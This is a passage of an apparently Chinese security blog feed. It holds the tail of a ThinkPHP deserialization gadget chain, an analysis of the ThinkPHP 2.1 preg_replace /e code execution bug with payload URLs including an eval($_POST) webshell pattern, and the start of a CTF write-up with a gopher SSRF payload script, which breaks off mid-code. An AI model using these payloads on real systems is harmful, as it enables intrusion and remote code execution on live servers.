class="keyword">$this</span>-&gt;db=<span class="keyword">new</span> Mysql();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">PDO</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> ;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options= <span class="keyword">array</span>(</span><br><span class="line">        PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>, <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        <span class="comment">//PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true,//堆叠打开</span></span><br><span class="line">        );   </span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;config= <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Imagick()));</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp2.1代码执行及路由分析</title>
      <link href="/2022/05/07/Thinkphp2.1%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90/"/>
      <url>/2022/05/07/Thinkphp2.1%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>Dispatcher.class.php这个文件中是url路由，由于第一次正式看路由那块，所以就从头开始一行一行看把。<br>首先是dispatch函数<br>是37行到140行<br>这个函数是做映射用，把url映射到控制器对我们来说算是最重要的一块</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$urlMode</span>  =  C(<span class="string">&#x27;URL_MODEL&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$urlMode</span> == URL_REWRITE ) &#123;</span><br><span class="line">    <span class="comment">//当前项目地址</span></span><br><span class="line">    <span class="variable">$url</span>    =   dirname(_PHP_FILE_);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$url</span> == <span class="string">&#x27;/&#x27;</span> || <span class="variable">$url</span> == <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">        <span class="variable">$url</span>    =   <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$urlMode</span> == URL_COMPAT)&#123;</span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,_PHP_FILE_.<span class="string">&#x27;?&#x27;</span>.C(<span class="string">&#x27;VAR_PATHINFO&#x27;</span>).<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//当前项目地址</span></span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,_PHP_FILE_);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一开始就调用了一个名叫C的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"><span class="variable">$name</span>=<span class="literal">null</span>, <span class="variable">$value</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$_config</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">// 无参数时获取所有</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$name</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_config</span>;</span><br><span class="line">    <span class="comment">// 优先执行设置获取或赋值</span></span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$name</span> = strtolower(<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">if</span> (is_null(<span class="variable">$value</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_config</span>[<span class="variable">$name</span>]) ? <span class="variable">$_config</span>[<span class="variable">$name</span>] : <span class="literal">null</span>;</span><br><span class="line">            <span class="variable">$_config</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 二维数组设置和获取支持</span></span><br><span class="line">        <span class="variable">$name</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$name</span>[<span class="number">0</span>] = strtolower(<span class="variable">$name</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$value</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]]) ? <span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]] : <span class="literal">null</span>;</span><br><span class="line">        <span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]] = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 批量设置</span></span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$name</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_config</span> = array_merge(<span class="variable">$_config</span>, array_change_key_case(<span class="variable">$name</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 避免非法参数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出这是一个对传入参数进行获取处理以及过滤的函数<br>而URL_MODEL是一个常量表示url的四种模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="string">&#x27;URL_MODEL&#x27;</span>      =&gt; <span class="number">1</span>,       <span class="comment">// URL访问模式,可选参数0、1、2、3,代表以下四种模式：</span></span><br><span class="line"><span class="comment">// 0 (普通模式); 1 (PATHINFO 模式); 2 (REWRITE  模式); 3 (兼容模式)  默认为PATHINFO 模式，提供最好的用户体验和SEO支持</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.cxyzjd.com/article/u012382791/50845351">四种模式</a><br>根据模式的不同url格式也有不同。这里到没有什么太多可说的。接下来是一长串对二级域名进行处理的，也先跳过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span>(!<span class="built_in">self</span>::routerCheck())&#123;   <span class="comment">// 检测路由规则 如果没有则按默认规则调度URL</span></span><br><span class="line">        <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">        <span class="variable">$var</span>  =  <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]))&#123;</span><br><span class="line">            <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(C(<span class="string">&#x27;APP_GROUP_DENY&#x27;</span>) &amp;&amp; in_array(strtolower(<span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_DENY&#x27;</span>))))) &#123;</span><br><span class="line">                <span class="comment">// 禁止直接访问分组</span></span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)])) &#123;<span class="comment">// 还没有定义模块名称</span></span><br><span class="line">            <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)]  =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_ACTION&#x27;</span>)]  =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">        <span class="comment">// 解析剩余的URL参数</span></span><br><span class="line">        <span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line">        <span class="variable">$_GET</span>   =  array_merge(<span class="variable">$var</span>,<span class="variable">$_GET</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取分组 模块和操作名称</span></span><br><span class="line">    <span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        define(<span class="string">&#x27;GROUP_NAME&#x27;</span>, <span class="built_in">self</span>::getGroup(C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)));</span><br><span class="line">        <span class="comment">// 加载分组配置文件</span></span><br><span class="line">        <span class="keyword">if</span>(is_file(CONFIG_PATH.GROUP_NAME.<span class="string">&#x27;/config.php&#x27;</span>))</span><br><span class="line">            C(<span class="keyword">include</span> CONFIG_PATH.GROUP_NAME.<span class="string">&#x27;/config.php&#x27;</span>);</span><br><span class="line">        <span class="comment">// 加载分组函数文件</span></span><br><span class="line">        <span class="keyword">if</span>(is_file(COMMON_PATH.GROUP_NAME.<span class="string">&#x27;/function.php&#x27;</span>))</span><br><span class="line">            <span class="keyword">include</span> COMMON_PATH.GROUP_NAME.<span class="string">&#x27;/function.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    define(<span class="string">&#x27;MODULE_NAME&#x27;</span>,<span class="built_in">self</span>::getModule(C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)));</span><br><span class="line">    define(<span class="string">&#x27;ACTION_NAME&#x27;</span>,<span class="built_in">self</span>::getAction(C(<span class="string">&#x27;VAR_ACTION&#x27;</span>)));</span><br><span class="line">    <span class="comment">// URL常量</span></span><br><span class="line">    <span class="comment">// 当前页面地址</span></span><br><span class="line">    <span class="comment">//define(&#x27;__SELF__&#x27;,$_SERVER[&#x27;PHP_SELF&#x27;]);</span></span><br><span class="line">    define(<span class="string">&#x27;__SELF__&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    define(<span class="string">&#x27;__INFO__&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>]);</span><br><span class="line">    <span class="comment">// 当前项目地址</span></span><br><span class="line">    define(<span class="string">&#x27;__APP__&#x27;</span>,PHP_FILE);</span><br><span class="line">    <span class="comment">// 当前模块和分组地址</span></span><br><span class="line">    <span class="variable">$module</span> = defined(<span class="string">&#x27;P_MODULE_NAME&#x27;</span>)?P_MODULE_NAME:MODULE_NAME;</span><br><span class="line">    <span class="keyword">if</span>(defined(<span class="string">&#x27;GROUP_NAME&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$group</span>   = C(<span class="string">&#x27;URL_CASE_INSENSITIVE&#x27;</span>) ?strtolower(GROUP_NAME):GROUP_NAME;</span><br><span class="line">        define(<span class="string">&#x27;__GROUP__&#x27;</span>,(!<span class="keyword">empty</span>(<span class="variable">$domainGroup</span>) || GROUP_NAME == C(<span class="string">&#x27;DEFAULT_GROUP&#x27;</span>) )?__APP__ : __APP__.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$group</span>);</span><br><span class="line">        define(<span class="string">&#x27;__URL__&#x27;</span>,!<span class="keyword">empty</span>(<span class="variable">$domainModule</span>)?__GROUP__.<span class="variable">$depr</span> : __GROUP__.<span class="variable">$depr</span>.<span class="variable">$module</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        define(<span class="string">&#x27;__URL__&#x27;</span>,!<span class="keyword">empty</span>(<span class="variable">$domainModule</span>)?__APP__.<span class="string">&#x27;/&#x27;</span> : __APP__.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$module</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当前操作地址</span></span><br><span class="line">    define(<span class="string">&#x27;__ACTION__&#x27;</span>,__URL__.<span class="variable">$depr</span>.ACTION_NAME);</span><br><span class="line">    <span class="comment">//保证$_REQUEST正常取值</span></span><br><span class="line">    <span class="variable">$_REQUEST</span> = array_merge(<span class="variable">$_POST</span>,<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>路由控制这块重点应该是这串代码，所以重点看下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]))&#123;</span><br><span class="line">                <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这一段代码是对分组进行处理首先判断是否有分组，默认是否能从分组获取变量。$paths=explode( $depr,trim( $_SERVER[‘PATH_INFO’],’/‘)); $_SERVER[‘PATH_INFO’]是返回用户查询语句查询的真实脚本后面的url真实路径<br>比如<a href="http://127.0.0.1/1/url.php/test/test/1.php?test=123%E8%BF%99%E7%A7%8D%E6%A0%BC%E5%BC%8F%E4%BC%9A%E8%BF%94%E5%9B%9Eurl.php%E5%90%8E%E9%9D%A2%E7%9A%84%E8%B7%AF%E5%BE%84%E4%B9%9F%E5%B0%B1%E6%98%AF/test/test/1.php%E3%80%82">http://127.0.0.1/1/url.php/test/test/1.php?test=123这种格式会返回url.php后面的路径也就是/test/test/1.php。</a><br>而之前 $depr = C(‘URL_PATHINFO_DEPR’); C(‘URL_PATHINFO_DEPR’)是PATHINFO模式下的分割符号。</p><p>所以这段代码本地测试了一下经过exlode处理后上面那段url的返回值是<br>Array ([0] =&gt; [1] =&gt; test [2] =&gt; test [3] =&gt; 1.php)<br>array_shift是去除数组的开头单元。那么$var最后的值是去除了[0]这单元的数组或者为空。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  该代码块首先检测路由规则，如果没有制定规则则按照默认规则进行URL调度，在preg_replace()函数中，正则表达式中使用了/e模式，将“替换字符串”作为PHP代码求值，并用其结果来替换所搜索的字符串。<br>正则表达式可以简化为“\w+/([^/])”，即搜索获取“/”前后的两个参数，$var[‘\1’]=”\2”;是对数组的操作，将之前搜索到的第一个值作为新数组的键，将第二个值作为新数组的值，我们发现可以构造搜索到的第二个值，即可执行任意PHP代码，在PHP中，我们可以使用${}里面可以执行函数，然后我们在thinkphp的url中的偶数位置使用${}格式的php代码，即可最终执行thinkphp任意代码执行漏洞</p><p>这一段就是thinkphp2.1命令执行的问题所在了，看看这段代码到底做了什么。<br>这里其实是因为preg_replace \e修饰符的问题，这个修饰符会把第二个参数当成php代码执行。简单结合上面的语句来说就是$ var[‘\1’]=”\2”;它把这个当成了一个回调函数，而1和2是implode($ depr,$paths)执行结果来代替。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$depr</span>=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"><span class="variable">$var</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$res</span>= preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>,<span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line">print_r(<span class="variable">$var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当输入<a href="http://127.0.0.1/html/1.php/module/%7B@phpinfo()%7D">http://127.0.0.1/html/1.php/module/%7B@phpinfo()%7D</a><br>这种url时会打印出Array ( [module] =&gt; {@phpinfo()} )<br><img src="https://img-blog.csdnimg.cn/dc9d2872af2c4f8fa7090a795bbe7f50.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>当输入<a href="http://127.0.0.1/html/module/%7B@phpinfo()%7D%E6%97%B6%E4%BC%9A%E6%89%A7%E8%A1%8Cphpinfo()">http://127.0.0.1/html/module/{@phpinfo()}时会执行phpinfo()</a><br>本地做测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;$&#123;@phpinfo()&#125;;&quot;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;b&#x27;</span>,<span class="number">2</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">    print_r(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/05453706db6c4348b058e94019cb5ded.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>这样写phpinfo()是可以执行成功的。然后把中间的代码改成了<br>$ a=array(0=&gt;”$ {@eval($_POST[s])};”,1=&gt;’b’,2=&gt;’c’)。<br>仔细想想其实因为数组赋值的问题，你用$标识一个变量之后，他是把变量的值赋给0所以就会导致执行。</p><p>而这个漏洞的利用格式为什么必须是index.php/xxx/xxx/xxx/${@phpinfo()}<br>是因为这里还是在这个文件，214到224行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$routes</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$route</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span> === stripos(<span class="variable">$regx</span>.<span class="variable">$depr</span>,<span class="variable">$route</span>[<span class="number">0</span>].<span class="variable">$depr</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 简单路由定义：array(&#x27;路由定义&#x27;,&#x27;分组/模块/操作名&#x27;, &#x27;路由对应变量&#x27;,&#x27;额外参数&#x27;),</span></span><br><span class="line">                    <span class="variable">$var</span>  =  <span class="built_in">self</span>::parseUrl(<span class="variable">$route</span>[<span class="number">1</span>]);</span><br><span class="line">                    <span class="comment">//  获取当前路由参数对应的变量</span></span><br><span class="line">                    <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(str_ireplace(<span class="variable">$route</span>[<span class="number">0</span>].<span class="variable">$depr</span>,<span class="variable">$depr</span>,<span class="variable">$regx</span>),<span class="variable">$depr</span>));</span><br><span class="line">                    <span class="variable">$vars</span>    =   explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$route</span>[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$vars</span>);<span class="variable">$i</span>++)</span><br><span class="line">                        <span class="variable">$var</span>[<span class="variable">$vars</span>[<span class="variable">$i</span>]]     =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">                    <span class="comment">// 解析剩余的URL参数</span></span><br><span class="line">                    <span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)\/([^,\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$paths</span>));</span><br></pre></td></tr></table></figure><p>thinkphp路由的格式是分组/模块/操作名/参数。而参数是被带入执行的。以这种格式传入的会执行命令。</p><p><a href="https://www.cnblogs.com/wangshuwin/p/7607120.html">转载自大佬博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第二届网刃杯web部分</title>
      <link href="/2022/05/07/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AFweb/"/>
      <url>/2022/05/07/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AFweb/</url>
      
        <content type="html"><![CDATA[<h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h2><p>一道SSRF<br><img src="https://img-blog.csdnimg.cn/ebc028637faf45fc821017dd2db8fbf3.png"><br>看大佬博客发现查看网络情况<br>（学到了，学到了）<br><img src="https://img-blog.csdnimg.cn/f3abe6f299b249cda5eb2675a46d06eb.png"><br>发现100这个ip有不同<br>访问<br><img src="https://img-blog.csdnimg.cn/dd10c285d71a402bbb3ea2c2509b2bf3.png"><br>随便传过去一个a，b看大佬博客发现利用exp<br>(利用gopher发送http请求)<br><a href="https://zhuanlan.zhihu.com/p/112055947">gopher详解</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /?a=1 HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.73.23.100</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 3</span></span><br><span class="line"><span class="string">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="string">Referer: bolean.club</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">b=1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">tmp = urllib.parse.quote(payload)<span class="comment">#对payload进行url编码</span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;?url=gopher://172.73.26.100:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)       <span 